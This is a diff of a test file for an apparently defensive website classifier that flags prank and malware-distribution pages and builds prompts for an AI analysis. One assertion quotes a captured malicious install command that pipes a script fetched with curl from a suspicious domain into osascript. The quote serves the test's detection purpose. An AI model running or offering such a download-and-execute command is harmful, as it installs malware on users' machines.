@@ -144,14 +144,14 @@ const fakeCaptchaCommand = capturedPage(
 );
 
 test("detailed analysis binds the page content to the exact captured URL", () => {
-	const input = buildWebsiteAnalysisInput(redirectArchive);
+	const input = buildWebsiteAnalysisInput(redirectArchive, { finding: "The captured destination was classified as a prank or troll page." });
 	const system = input[0].content as string;
 	const text = (input[1].content as Array<{ text: string }>)[0]!.text;
 
 	expect(system).toContain("never attribute one host's content to another");
 	expect(text).toContain(`The analyzed page is ${finalTrollHop.url}:`);
 	expect(text).toContain(shareGoogleHop.url);
-	expect(system).toContain("a prank/troll page");
+	expect(text).toContain("<case_finding>\nThe captured destination was classified as a prank or troll page.\n</case_finding>");
 	expect(text).toContain("You got trolled");
 });
 
@@ -481,18 +481,18 @@ const paneo = capturedPage(
 
 test("the classifier reads the whole page and the decoded install command, not a 10,000-character prefix", () => {
 	expect(paneo.archive.text.toString("utf-8").indexOf("Install Paneo")).toBeGreaterThan(12_000);
-	const analysis = buildWebsiteAnalysisInput({ ...paneo.archive });
+	const analysis = buildWebsiteAnalysisInput({ ...paneo.archive }, { finding: "The page distributes malware." });
 	const analysisText = (analysis[1].content as Array<{ text?: string }>)[0]!.text!;
 	expect(analysisText).toContain("2 Run the install command");
 	expect(analysisText).toContain("curl -sfL https://keychainagent.pro/wksxgj/ogZhMJB7F277 | osascript -l JavaScript");
-	expect(analysis[0].content).toContain("malware distribution");
+	expect(analysisText).toContain("<case_finding>\nThe page distributes malware.\n</case_finding>");
 
 	const classification = buildWebsiteClassificationInput(paneo.hop, { ...paneo.archive });
 	const system = classification[0].content as string;
 	const user = (classification[1].content as Array<{ text: string }>)[0]!.text;
 	expect(system).toContain("A page distributes malware when");
 	expect(system).toContain("The brand on a malware page may be invented");
-	// The narrative judges by the same rules, so it cannot call a page malware the classifier did not.
+	// The narrative explains the finding by the same rules the classifier decided it with.
 	expect(analysis[0].content).toContain("The brand on a malware page may be invented");
 	expect(analysis[0].content).toContain("that would harm them");
 	expect(user).toContain("Install Paneo");
